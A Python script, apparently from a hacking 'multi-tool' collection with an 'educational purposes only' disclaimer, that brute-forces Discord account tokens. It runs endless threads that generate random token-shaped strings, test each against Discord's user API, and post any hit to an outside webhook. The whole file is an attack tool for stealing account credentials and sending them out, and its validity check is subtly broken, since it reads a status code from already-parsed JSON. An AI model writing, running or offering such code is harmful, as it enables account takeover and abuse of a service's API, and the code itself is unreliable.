# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================


from Plugins.Utils import *
from Plugins.Config import *

try:
    import requests
    import string
    import random
    import threading
    import json
except Exception as e:
    MissingModule(e)

Title("Discord Token Generator")
Connection()

try:
    webhook = ChoiceWebhook()

    try:
        threads_number = int(input(f"{INPUT} Threads Number {red}->{white} ").strip())
    except:
        ErrorNumber()

    print(f"{LOADING} Generate Tokens..", reset)

    def SendWebhook(embed_content):
        payload = {
            'embeds': [embed_content],
            'username': username_webhook,
            'avatar_url': avatar_webhook
        }
        headers = {'Content-Type': 'application/json'}

        requests.post(webhook, data=json.dumps(payload), headers=headers)

    def TokenCheck():
        first_part  = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
        second_part = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
        third_part  =  ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
        token = f"{first_part}.{second_part}.{third_part}"

        try:
            response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()
            if response.status_code == 200:
                embed_content = {
                    "title": "Token found!",
                    "description": f"**Token:**\n```{token}```",
                    "color": color_embed,
                    "footer": {
                        "text": username_webhook,
                        "icon_url": avatar_webhook
                    }
                }
                SendWebhook(embed_content)
                print(f"{SUCCESS} Status:{red} Valid   {white}| Token:{red} {token}", reset)
            else:
                print(f"{ERROR} Status:{red} Invalid {white}| Token:{red} {token}", reset)
        except:
            print(f"{ERROR} Status:{red} Error   {white}| Token:{red} {token}", reset)

    def Request():
        threads = []
        try:
            for _ in range(int(threads_number)):
                t = threading.Thread(target=TokenCheck)
                threads.append(t)
                t.start()
        except:
            ErrorNumber()

        for thread in threads:
            thread.join()

    while True:
        Request()

except Exception as e:
    Error(e)